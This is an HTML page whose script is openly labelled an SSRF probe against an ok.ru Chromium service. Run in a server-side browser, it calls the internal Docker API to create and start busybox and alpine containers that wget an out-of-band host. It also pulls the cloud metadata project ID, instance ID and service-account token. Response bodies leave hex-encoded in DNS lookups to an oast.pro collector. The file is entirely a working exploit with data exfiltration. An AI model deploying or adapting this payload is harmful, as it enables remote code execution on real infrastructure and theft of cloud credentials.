<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>OK</title></head>
<body>
<script>
'use strict';
// ok.ru Chromium SSRF — probe v4
// Goal: prove Docker API POST via no-cors (container create + start = OOB hit from container IP)

const OOB = 'd9kjf7b6b8m9jk7s693gjsxj13ripi6b4.oast.pro';
const T0 = Date.now();

const clean = (s) => s.toLowerCase().replace(/[^a-z0-9-]/g, '-').replace(/-+/g, '-').replace(/^-|-$/g, '').substring(0, 60);

const dnsOob = (label) => {
  const l = clean(label);
  new Image().src = `https://${l}.${OOB}/`;
  fetch(`https://${l}.${OOB}/`, { mode: 'no-cors', signal: AbortSignal.timeout(3000) }).catch(() => {});
};

const errCode = (e) => {
  if (!e) return 'unk';
  const n = e.name || '';
  const m = (e.message || '').substring(0, 30).toLowerCase();
  if (n === 'AbortError') return 'ab';
  if (n === 'TypeError' && m.includes('cors')) return 'cors';
  if (n === 'TypeError' && m.includes('failed')) return 'te-ff';
  if (n === 'TypeError') return 'te';
  if (n === 'NetworkError') return 'ne';
  return n.substring(0, 4).toLowerCase();
};

const probe = async (lp, url, ms = 5000) => {
  const t0 = Date.now();
  try {
    const r = await fetch(url, { signal: AbortSignal.timeout(ms) });
    const body = await r.text();
    const elapsed = Date.now() - t0;
    const snip = body.substring(0, 8).replace(/[^a-z0-9]/gi, '').toLowerCase().substring(0, 8);
    dnsOob(`${lp}-ok-${r.status}-${elapsed}ms-${snip}`);
    if (body.length > 0) {
      const hex = Array.from(new TextEncoder().encode(body.substring(0, 60)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
      (hex.match(/.{1,50}/g) || []).forEach((c, i) => dnsOob(`${lp}-b${i}-${c}`));
    }
  } catch (e) {
    dnsOob(`${lp}-err-${errCode(e)}-${Date.now()-t0}ms`);
  }
};

const ncProbe = async (lp, url, method = 'GET', body = null, ms = 5000) => {
  const t0 = Date.now();
  const opts = { method, mode: 'no-cors', signal: AbortSignal.timeout(ms) };
  if (body !== null) opts.body = body;
  try {
    await fetch(url, opts);
    dnsOob(`${lp}-nc-ok-${Date.now()-t0}ms`);
  } catch (e) {
    dnsOob(`${lp}-nc-err-${errCode(e)}-${Date.now()-t0}ms`);
  }
};

(async () => {
  dnsOob(`exec-v4-${clean(navigator.userAgent.substring(0, 40))}`);

  // A: no-cors vs cors GET /_ping — does no-cors behave differently re: PNA?
  await ncProbe('dp-nc', 'http://172.17.0.1:2375/_ping', 'GET', null, 5000);
  await probe('dp-c',   'http://172.17.0.1:2375/_ping', 5000);

  // B: Docker POST — create container with busybox, run wget to OOB
  // OOB hit from container IP (172.17.0.x) proves RCE — different IP than Chromium service
  const createBody = JSON.stringify({
    Image: 'busybox',
    Cmd: ['wget', '-q', '-T', '5', `http://v4rce.${OOB}/`],
    HostConfig: { NetworkMode: 'bridge' }
  });
  await ncProbe('dc-cr', 'http://172.17.0.1:2375/containers/create?name=ssrf-v4', 'POST', createBody, 5000);
  await new Promise(r => setTimeout(r, 300));
  await ncProbe('dc-st', 'http://172.17.0.1:2375/containers/ssrf-v4/start', 'POST', '', 5000);

  // Wait for container wget to fire (5s timeout in wget itself)
  await new Promise(r => setTimeout(r, 6000));
  dnsOob('dc-wait-done');

  // Fallback: alpine
  const createAlpine = JSON.stringify({
    Image: 'alpine',
    Cmd: ['wget', '-q', '-T', '5', `http://v4rce-al.${OOB}/`],
    HostConfig: { NetworkMode: 'bridge' }
  });
  await ncProbe('dc-cr-al', 'http://172.17.0.1:2375/containers/create?name=ssrf-v4-al', 'POST', createAlpine, 5000);
  await new Promise(r => setTimeout(r, 300));
  await ncProbe('dc-st-al', 'http://172.17.0.1:2375/containers/ssrf-v4-al/start', 'POST', '', 5000);
  await new Promise(r => setTimeout(r, 6000));
  dnsOob('dc-al-wait-done');

  // C: YC IMDS with Metadata-Flavor header
  const probeH = async (lp, url, headers, ms = 5000) => {
    const t0 = Date.now();
    try {
      const r = await fetch(url, { headers, signal: AbortSignal.timeout(ms) });
      const body = await r.text();
      const snip = body.substring(0, 8).replace(/[^a-z0-9]/gi, '').toLowerCase().substring(0, 8);
      dnsOob(`${lp}-ok-${r.status}-${Date.now()-t0}ms-${snip}`);
      if (body.length > 0) {
        const hex = Array.from(new TextEncoder().encode(body.substring(0, 60)))
          .map(b => b.toString(16).padStart(2, '0')).join('');
        (hex.match(/.{1,50}/g) || []).forEach((c, i) => dnsOob(`${lp}-b${i}-${c}`));
      }
    } catch (e) { dnsOob(`${lp}-err-${errCode(e)}-${Date.now()-t0}ms`); }
  };
  await probeH('yc-pid', 'http://169.254.169.254/computeMetadata/v1/project/project-id', { 'Metadata-Flavor': 'Google' });
  await probeH('yc-iid', 'http://169.254.169.254/computeMetadata/v1/instance/id',         { 'Metadata-Flavor': 'Google' });
  await probeH('yc-tok', 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', { 'Metadata-Flavor': 'Google' });

  dnsOob(`done-v4-${Date.now()-T0}ms`);
})();
</script>
</body>
</html>
